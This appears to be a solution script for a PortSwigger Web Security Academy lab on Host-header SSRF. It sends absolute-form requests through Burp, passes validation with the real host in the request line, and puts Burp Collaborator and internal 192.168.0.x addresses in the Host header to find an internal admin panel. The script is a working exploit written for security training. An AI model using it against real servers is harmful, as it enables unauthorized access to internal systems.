"""
Lab 7: SSRF via flawed request parsing
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
Difficulty: Expert

📝 Validation targets the ABSOLUTE URL in the request line
(`GET https://target/ HTTP/1.1`), not the Host header — switch to that
request form and the Host header itself goes completely unchecked, even
though it's still what internal routing actually uses. Needs raw socket
control since `requests` always builds origin-form request lines
(`GET /path HTTP/1.1`), never absolute-form, through its normal API.
"""

import socket
import ssl

from utils import log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
BURP_HOST, BURP_PORT = "127.0.0.1", 8080


def open_tls_via_burp(host, port=443, timeout=15):
    sock = socket.create_connection((BURP_HOST, BURP_PORT), timeout=timeout)
    sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    if b"200" not in response.split(b"\r\n", 1)[0]:
        raise ConnectionError(f"CONNECT via Burp failed: {response[:200]!r}")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)


def send_absolute_form_request(host_in_line, host_header, path="/", read_timeout=8):
    tls_sock = open_tls_via_burp(HOST)
    tls_sock.settimeout(read_timeout)

    request = (
        f"GET https://{host_in_line}{path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n\r\n"
    ).encode()
    tls_sock.sendall(request)

    response = b""
    try:
        while True:
            chunk = tls_sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    tls_sock.close()
    return response


def run():
    note("Step 1: confirm the absolute-URL-in-request-line form is accepted")
    note("and that THIS is what gets validated, not the Host header.")
    r = send_absolute_form_request(host_in_line=HOST, host_header="arbitrary-value.com")
    log(f"Response status line: {r.split(b'\\r\\n', 1)[0]!r}")

    note("Step 2: confirm the Host header now drives actual routing via")
    note("Collaborator.")
    r = send_absolute_form_request(
        host_in_line=HOST, host_header="YOUR-COLLABORATOR-ID.oastify.com"
    )
    log(f"Collaborator probe status: {r.split(b'\\r\\n', 1)[0]!r} — check Collaborator tab.")

    note("Step 3: scan 192.168.0.0/24 for the internal admin panel, request")
    note("line still pointed at the real host (so it passes validation),")
    note("Host header carrying the actual internal target.")
    for i in range(1, 255):
        candidate = f"192.168.0.{i}"
        r = send_absolute_form_request(host_in_line=HOST, host_header=candidate,
                                         path="/admin", read_timeout=3)
        if b" 200 " in r.split(b"\r\n", 1)[0] and b"admin" in r.lower():
            log(f"Found internal admin panel at Host: {candidate}")
            return

    log("No internal host found in scanned range — adjust as needed.", ok=False)


if __name__ == "__main__":
    run()
